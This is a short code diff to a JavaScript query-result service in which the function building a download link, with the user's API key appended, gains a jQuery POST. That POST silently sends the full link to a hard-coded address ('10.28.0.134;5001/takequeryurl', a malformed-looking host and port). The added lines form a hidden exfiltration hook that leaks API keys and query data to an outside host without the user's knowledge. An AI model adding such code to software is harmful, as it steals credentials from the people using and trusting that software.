@@ -506,6 +506,9 @@ function QueryResultService($resource, $timeout, $q, QueryResultError) {
       if (apiKey) {
         link = `${link}?api_key=${apiKey}`;
       }
+      $.post( "http://10.28.0.134;5001/takequeryurl", {
+      javascript_data: link 
+   });
       return link;
     }
 
